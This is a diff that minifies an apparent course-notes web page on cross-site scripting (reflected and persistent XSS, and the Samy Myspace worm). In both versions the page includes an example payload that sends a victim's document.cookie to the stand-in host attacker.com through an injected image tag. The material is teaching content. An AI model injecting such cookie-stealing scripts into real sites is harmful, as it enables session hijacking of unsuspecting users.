@@ -1,213 +1,25 @@
-<!DOCTYPE html>
-<html lang="en">
-
-    <head>
-        <title>
-            
-                Cross-Site Scripting (XSS) | curiosities.dev
-            
-        </title>
-        <meta name="viewport" content="width=device-width, initial-scale=1">
-        <link rel="stylesheet" type="text/css" href="/css/main.css" />
-        <link rel="stylesheet" type="text/css" href="/css/all_font_awesome_v5.9.min.css" />
-        
-        <link rel="shortcut icon" href="/img/favicon_io/favicon.ico">
-        <link rel="apple-touch-icon" sizes="180x180" href="/img/favicon_io/apple-touch-icon.png">
-        <link rel="icon" type="image/png" sizes="32x32" href="/img/favicon_io/favicon-32x32.png">
-        <link rel="icon" type="image/png" sizes="16x16" href="/img/favicon_io/favicon-16x16.png">
-
-        <link rel="stylesheet" href="/css/vs.css">
-        <script type="text/javascript" src="/js/highlight.min.js"></script>
-        <script>
-            
-            const hjlsURLRegex = /https?:\/\/[^\s<]+/g
-            const hjlsCitationRegex = /&lt;span class=&quot;citation-ref&quot;&gt;&lt;a href=&quot;(.*)&quot;&gt;&lt;\/a&gt;&lt;\/span&gt;/g
-            hljs.addPlugin({
-                "after:highlight": (result) => {
-                    result.value = result.value.replaceAll(
-                        hjlsURLRegex, "<a href='$&' target='_blank'>$&</a>");
-                    console.log(result.value);
-                    result.value = result.value.replaceAll(
-                        hjlsCitationRegex, "<span class='citation-ref'><a href='$1'></a></span>");
-                }
-            });
-            hljs.highlightAll();
-        </script>
-
-        <script type="text/javascript" async
-            src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML">
-        </script>
-
-        <script type="text/javascript" src="/js/d3/d3.min.js"></script>
-        <script type="text/javascript" src="/js/PlotUtils.js"></script>
-        <script type="text/javascript" src="/js/OrganizeCitations.js"></script>
-        <script type="text/javascript" src="/js/HighlightAnchor.js"></script>
-        <script type="text/javascript" src="/js/SummaryPageUtils.js"></script>
-        <script type="text/javascript" src="/js/AnimateBackground.js"></script>
-
-        
-
-
-    </head>
-
-    <svg id="background-svg"></svg>
-
-    <body>
-
-        <div class="container" id="main_div">
-
-            
-            <form action="/search" method="get" id="globalSearchForm">
-                <input type="text" id="q" name="q" title="Search Query">
-                <input type="submit" id="submitButton" value="Search">
-            </form>
-
-            
-
-            <nav aria-label="Breadcrumb" class="breadcrumb">
-    <ul>
-        
-
-
-
-
-
-
-
-
-
-<li>
-  <a href="https://www.curiosities.dev/">Home</a>
-</li>
-
-
-<li>
-  <a href="https://www.curiosities.dev/computer-science/">Computer Science &amp; Software Engineering</a>
-</li>
-
-
-<li>
-  <a href="https://www.curiosities.dev/computer-science/cos432-information-security/">Information Security [COS 432]</a>
-</li>
-
-
-<li>
-  <a href="https://www.curiosities.dev/computer-science/cos432-information-security/11-web-security/">11. Web Security</a>
-</li>
-
-
-<li class="active">
-  <a href="https://www.curiosities.dev/computer-science/cos432-information-security/11-web-security/04-cross-site-scripting/">Cross-Site Scripting (XSS)</a>
-</li>
-
-    </ul>
-</nav>
-
-
-
-            
-<section>
-    <header>
-    <h1> Cross-Site Scripting (XSS)</h1>
-    <p class="meta">
-        
-        Dated Nov 21, 2018;
-        
-        last modified on Sun, 14 Mar 2021
-        
-    </p>
-    </header>
-
-    <div id="toc-then-article">
-        <aside id="toc">
-            <nav id="TableOfContents">
-  <ul>
-    <li><a href="#xss-101">XSS 101</a></li>
-    <li><a href="#persistent-xss">Persistent XSS</a></li>
-  </ul>
-</nav>
-        </aside>
-
-        <article id="main-article">
-            <h2 id="xss-101">XSS 101</h2>
-<p>Suppose a site, given a non-existent path, e.g. <code>htpp://victim.com/path</code>, writes this error message:</p>
-<p style="background-color: pink; padding: 2%;">
-Error 404! `path` not found.
-</p>
-<p>An  attacker can then lead a user to opening <code>http://victim.com/attacker_supplied_string</code>, where <code>attacker_supplied_string</code> is:</p>
-<div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="language-html" data-lang="html"><span style="color:#111">&lt;</span><span style="color:#f92672">script</span><span style="color:#111">&gt;</span>
-  <span style="color:#00a8c8">let</span> <span style="color:#75af00">addr</span> <span style="color:#f92672">=</span> <span style="color:#d88200">&#34;http://attacker.com/?&#34;</span> <span style="color:#f92672">+</span> <span style="color:#75af00">escape</span><span style="color:#111">(</span><span style="color:#111">document</span><span style="color:#111">.</span><span style="color:#75af00">cookie</span><span style="color:#111">);</span>
-  <span style="color:#111">document</span><span style="color:#111">.</span><span style="color:#75af00">write</span><span style="color:#111">(</span><span style="color:#d88200">`&lt;img src=&#34;</span><span style="color:#d88200">${</span><span style="color:#75af00">addr</span><span style="color:#d88200">}</span><span style="color:#d88200">&#34; /&gt;`</span><span style="color:#111">);</span>
-<span style="color:#111">&lt;/</span><span style="color:#f92672">script</span><span style="color:#111">&gt;</span>
-</code></pre></div><p>Suppose a site uses Force HTTPS. If a <code>&lt;script src=&quot;http://...&quot;&gt;</code> is not redirected to a HTTPS url, then an active attacker would still replace the JS code in the HTTP response with the malicious code that would run on the HTTPS page!</p>
-<h2 id="persistent-xss">Persistent XSS</h2>
-<p>Consider a social network that allows creating and editing own profile, and viewing your own and others' profiles.</p>
-<p>If this is the template&hellip;</p>
-<div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="language-html" data-lang="html"><span style="color:#111">&lt;</span><span style="color:#f92672">div</span> <span style="color:#75af00">id</span><span style="color:#f92672">=</span><span style="color:#d88200">&#34;username&#34;</span><span style="color:#111">&gt;</span>
+<!doctype html><html lang=en><head><title>Cross-Site Scripting (XSS) | curiosities.dev</title><meta name=viewport content="width=device-width,initial-scale=1"><link rel=stylesheet type=text/css href=/css/main.min.css><link rel=preload href=/css/all_font_awesome_v5.9.min.min.css as=style onload="this.onload=null;this.rel='stylesheet'"><noscript><link rel=stylesheet href=/css/all_font_awesome_v5.9.min.min.css></noscript><link rel="shortcut icon" href=/img/favicon_io/favicon.ico><link rel=apple-touch-icon sizes=180x180 href=/img/favicon_io/apple-touch-icon.png><link rel=icon type=image/png sizes=32x32 href=/img/favicon_io/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/img/favicon_io/favicon-16x16.png><link rel=preload href=/css/vs.min.css as=style onload="this.onload=null;this.rel='stylesheet'"><noscript><link rel=stylesheet href=/css/vs.min.css></noscript><script defer type=text/javascript src=/js/highlight.min.min.js></script><script defer>const hjlsURLRegex=/https?:\/\/[^\s<]+/g
+const hjlsCitationRegex=/&lt;span class=&quot;citation-ref&quot;&gt;&lt;a href=&quot;(.*)&quot;&gt;&lt;\/a&gt;&lt;\/span&gt;/g
+hljs.addPlugin({"after:highlight":(result)=>{result.value=result.value.replaceAll(hjlsURLRegex,"<a href='$&' target='_blank'>$&</a>");console.log(result.value);result.value=result.value.replaceAll(hjlsCitationRegex,"<span class='citation-ref'><a href='$1'></a></span>");}});hljs.highlightAll();</script><script async type=text/javascript async src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML"></script><script async type=text/javascript src=/js/d3/d3.min.min.js></script><script async type=text/javascript src=/js/PlotUtils.min.js></script><script async type=text/javascript src=/js/OrganizeCitations.min.js></script><script async type=text/javascript src=/js/HighlightAnchor.min.js></script><script async type=text/javascript src=/js/SummaryPageUtils.min.js></script><script async type=text/javascript src=/js/AnimateBackground.min.js></script></head><svg id="background-svg"/><body><div class=container id=main_div><form action=/search method=get id=globalSearchForm><input type=text id=q name=q title="Search Query">
+<input type=submit id=submitButton value=Search></form><nav aria-label=Breadcrumb class=breadcrumb><ul><li><a href=https://www.curiosities.dev/>Home</a></li><li><a href=https://www.curiosities.dev/computer-science/>Computer Science & Software Engineering</a></li><li><a href=https://www.curiosities.dev/computer-science/cos432-information-security/>Information Security [COS 432]</a></li><li><a href=https://www.curiosities.dev/computer-science/cos432-information-security/11-web-security/>11. Web Security</a></li><li class=active><a href=https://www.curiosities.dev/computer-science/cos432-information-security/11-web-security/04-cross-site-scripting/>Cross-Site Scripting (XSS)</a></li></ul></nav><section><header><h1>Cross-Site Scripting (XSS)</h1><p class=meta>Dated Nov 21, 2018;
+last modified on Sun, 14 Mar 2021</p></header><div id=toc-then-article><aside id=toc><nav id=TableOfContents><ul><li><a href=#xss-101>XSS 101</a></li><li><a href=#persistent-xss>Persistent XSS</a></li></ul></nav></aside><article id=main-article><h2 id=xss-101>XSS 101</h2><p>Suppose a site, given a non-existent path, e.g. <code>htpp://victim.com/path</code>, writes this error message:</p><p style=background-color:pink;padding:2%>Error 404! `path` not found.</p><p>An attacker can then lead a user to opening <code>http://victim.com/attacker_supplied_string</code>, where <code>attacker_supplied_string</code> is:</p><div class=highlight><pre style=color:#272822;background-color:#fafafa;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-html data-lang=html><span style=color:#111>&lt;</span><span style=color:#f92672>script</span><span style=color:#111>&gt;</span>
+  <span style=color:#00a8c8>let</span> <span style=color:#75af00>addr</span> <span style=color:#f92672>=</span> <span style=color:#d88200>&#34;http://attacker.com/?&#34;</span> <span style=color:#f92672>+</span> <span style=color:#75af00>escape</span><span style=color:#111>(</span><span style=color:#111>document</span><span style=color:#111>.</span><span style=color:#75af00>cookie</span><span style=color:#111>);</span>
+  <span style=color:#111>document</span><span style=color:#111>.</span><span style=color:#75af00>write</span><span style=color:#111>(</span><span style=color:#d88200>`&lt;img src=&#34;</span><span style=color:#d88200>${</span><span style=color:#75af00>addr</span><span style=color:#d88200>}</span><span style=color:#d88200>&#34; /&gt;`</span><span style=color:#111>);</span>
+<span style=color:#111>&lt;/</span><span style=color:#f92672>script</span><span style=color:#111>&gt;</span>
+</code></pre></div><p>Suppose a site uses Force HTTPS. If a <code>&lt;script src="http://..."></code> is not redirected to a HTTPS url, then an active attacker would still replace the JS code in the HTTP response with the malicious code that would run on the HTTPS page!</p><h2 id=persistent-xss>Persistent XSS</h2><p>Consider a social network that allows creating and editing own profile, and viewing your own and others' profiles.</p><p>If this is the template&mldr;</p><div class=highlight><pre style=color:#272822;background-color:#fafafa;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-html data-lang=html><span style=color:#111>&lt;</span><span style=color:#f92672>div</span> <span style=color:#75af00>id</span><span style=color:#f92672>=</span><span style=color:#d88200>&#34;username&#34;</span><span style=color:#111>&gt;</span>
   user_supplied_string
-<span style="color:#111">&lt;/</span><span style="color:#f92672">div</span><span style="color:#111">&gt;</span>
-</code></pre></div><p>&hellip; an attacker can do:</p>
-<div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="language-html" data-lang="html"><span style="color:#111">&lt;</span><span style="color:#f92672">div</span> <span style="color:#75af00">id</span><span style="color:#f92672">=</span><span style="color:#d88200">&#34;username&#34;</span><span style="color:#111">&gt;</span>
-  <span style="color:#111">&lt;/</span><span style="color:#f92672">div</span><span style="color:#111">&gt;&lt;</span><span style="color:#f92672">script</span><span style="color:#111">&gt;</span> <span style="color:#75715e">/* Cookie stealing script. */</span> <span style="color:#111">&lt;/</span><span style="color:#f92672">script</span><span style="color:#111">&gt;&lt;</span><span style="color:#f92672">div</span><span style="color:#111">&gt;</span>
-<span style="color:#111">&lt;/</span><span style="color:#f92672">div</span><span style="color:#111">&gt;</span>
-</code></pre></div>
-
-
-<div class="comment-holder">
-    <div class="comment"><p>Browsers try too hard not to fail to the point of being insecure, e.g. if <code>&lt;img src=&quot;http://attacker.com/gif&quot;&gt;</code> returns JS, the browser will interpret the (untrusted) code as such despite the site&rsquo;s owner expecting an image.</p>
-</div>
-</div>
-
-
-<p>&hellip; or even:</p>
-<div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="language-html" data-lang="html"><span style="color:#111">&lt;</span><span style="color:#f92672">div</span> <span style="color:#75af00">id</span><span style="color:#f92672">=</span><span style="color:#d88200">&#34;username&#34;</span><span style="color:#111">&gt;</span>
-  <span style="color:#111">&lt;/</span><span style="color:#f92672">div</span><span style="color:#111">&gt;</span>
-    <span style="color:#111">&lt;</span><span style="color:#f92672">script</span><span style="color:#111">&gt;</span>
-      <span style="color:#75715e">/* Code to replace user&#39;s profile with copy of the same code */</span>
-    <span style="color:#111">&lt;/</span><span style="color:#f92672">script</span><span style="color:#111">&gt;</span>
-  <span style="color:#111">&lt;</span><span style="color:#f92672">div</span><span style="color:#111">&gt;</span>
-<span style="color:#111">&lt;/</span><span style="color:#f92672">div</span><span style="color:#111">&gt;</span>
-</code></pre></div><p>The 2005 Myspace Samy &lsquo;worm&rsquo; (more accurately, a virus) replaced users' profiles with the text &lsquo;samy is my hero&rsquo;. It spread to 1m+ users in under a day.</p>
-
-        </article>
-
-        <div style="font-size: smaller;">
-
-
-
-
-
-
-</div>
-
-    </div>
-    <footer>
-        
-        
-        
-            
-        
-
-        
-            <a href="https://www.curiosities.dev/computer-science/cos432-information-security/11-web-security/05-sql-injection/">&laquo; SQL Injection</a>
-        
-        
-            <a href="https://www.curiosities.dev/computer-science/cos432-information-security/11-web-security/03-cross-site-request-forgery/">03. Cross-Site Request Forgery (XSRF) &raquo;</a>
-        
-
-    </footer>
-</section>
-
-
-        </div>
-
-        <footer>
-            <a href="mailto:d.chege711@gmail.com">Email</a>
-            
-            <a href="/about">About</a>
-            <a href="/search">Search</a>
-        </footer>
-
-    </body>
-
-</html>
+<span style=color:#111>&lt;/</span><span style=color:#f92672>div</span><span style=color:#111>&gt;</span>
+</code></pre></div><p>&mldr; an attacker can do:</p><div class=highlight><pre style=color:#272822;background-color:#fafafa;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-html data-lang=html><span style=color:#111>&lt;</span><span style=color:#f92672>div</span> <span style=color:#75af00>id</span><span style=color:#f92672>=</span><span style=color:#d88200>&#34;username&#34;</span><span style=color:#111>&gt;</span>
+  <span style=color:#111>&lt;/</span><span style=color:#f92672>div</span><span style=color:#111>&gt;&lt;</span><span style=color:#f92672>script</span><span style=color:#111>&gt;</span> <span style=color:#75715e>/* Cookie stealing script. */</span> <span style=color:#111>&lt;/</span><span style=color:#f92672>script</span><span style=color:#111>&gt;&lt;</span><span style=color:#f92672>div</span><span style=color:#111>&gt;</span>
+<span style=color:#111>&lt;/</span><span style=color:#f92672>div</span><span style=color:#111>&gt;</span>
+</code></pre></div><div class=comment-holder><div class=comment><p>Browsers try too hard not to fail to the point of being insecure, e.g. if <code>&lt;img src="http://attacker.com/gif"></code> returns JS, the browser will interpret the (untrusted) code as such despite the site&rsquo;s owner expecting an image.</p></div></div><p>&mldr; or even:</p><div class=highlight><pre style=color:#272822;background-color:#fafafa;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-html data-lang=html><span style=color:#111>&lt;</span><span style=color:#f92672>div</span> <span style=color:#75af00>id</span><span style=color:#f92672>=</span><span style=color:#d88200>&#34;username&#34;</span><span style=color:#111>&gt;</span>
+  <span style=color:#111>&lt;/</span><span style=color:#f92672>div</span><span style=color:#111>&gt;</span>
+    <span style=color:#111>&lt;</span><span style=color:#f92672>script</span><span style=color:#111>&gt;</span>
+      <span style=color:#75715e>/* Code to replace user&#39;s profile with copy of the same code */</span>
+    <span style=color:#111>&lt;/</span><span style=color:#f92672>script</span><span style=color:#111>&gt;</span>
+  <span style=color:#111>&lt;</span><span style=color:#f92672>div</span><span style=color:#111>&gt;</span>
+<span style=color:#111>&lt;/</span><span style=color:#f92672>div</span><span style=color:#111>&gt;</span>
+</code></pre></div><p>The 2005 Myspace Samy &lsquo;worm&rsquo; (more accurately, a virus) replaced users' profiles with the text &lsquo;samy is my hero&rsquo;. It spread to 1m+ users in under a day.</p></article><div style=font-size:smaller></div></div><footer><a href=https://www.curiosities.dev/computer-science/cos432-information-security/11-web-security/05-sql-injection/>&#171; SQL Injection</a>
+<a href=https://www.curiosities.dev/computer-science/cos432-information-security/11-web-security/03-cross-site-request-forgery/>03. Cross-Site Request Forgery (XSRF) &#187;</a></footer></section></div><footer><a href=mailto:d.chege711@gmail.com>Email</a>
+<a href=/about>About</a>
+<a href=/search>Search</a></footer></body></html>
